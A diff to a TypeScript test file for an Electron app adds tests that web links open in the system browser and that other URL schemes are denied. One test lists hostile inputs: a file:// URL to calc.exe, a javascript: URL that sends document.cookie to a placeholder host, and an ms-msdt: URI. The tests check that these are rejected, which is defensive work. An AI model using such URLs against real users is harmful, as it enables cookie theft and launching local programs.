@@ -947,7 +947,42 @@ describe("the window", () => {
 
   it("denies every window-open request", async () => {
     const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
-    expect(electron.BrowserWindow.instances[0]!.windowOpenHandler!()).toEqual({ action: "deny" });
+    expect(electron.BrowserWindow.instances[0]!.windowOpenHandler!({ url: "" })).toEqual({
+      action: "deny",
+    });
+  });
+
+  it("sends a web link to the browser rather than nowhere", async () => {
+    // About's links row is the app's only <a target="_blank">, and denying
+    // the open without handing the URL anywhere makes every one of them a
+    // link that looks clickable and does nothing.
+    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
+    const open = electron.BrowserWindow.instances[0]!.windowOpenHandler!;
+    open({ url: "https://github.com/echem-labs/local-cut-ai" });
+    open({ url: "http://127.0.0.1:7830/docs" });
+    expect(electron.openedExternally).toEqual([
+      "https://github.com/echem-labs/local-cut-ai",
+      "http://127.0.0.1:7830/docs",
+    ]);
+  });
+
+  it("refuses to hand the OS anything that is not a web link", async () => {
+    // openExternal launches whatever the OS has registered for the scheme.
+    // The release feed supplies one of these URLs, so a feed that has been
+    // tampered with must not be able to start a local program - and a
+    // denied open with no openExternal call is the correct, inert outcome.
+    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
+    const open = electron.BrowserWindow.instances[0]!.windowOpenHandler!;
+    for (const url of [
+      "file:///C:/Windows/System32/calc.exe",
+      "javascript:fetch('http://x/'+document.cookie)",
+      "ms-msdt:/id PCWDiagnostic",
+      "not a url at all",
+      "",
+    ]) {
+      expect(open({ url })).toEqual({ action: "deny" });
+    }
+    expect(electron.openedExternally).toEqual([]);
   });
 
   it("quits instead of opening a second window", async () => {
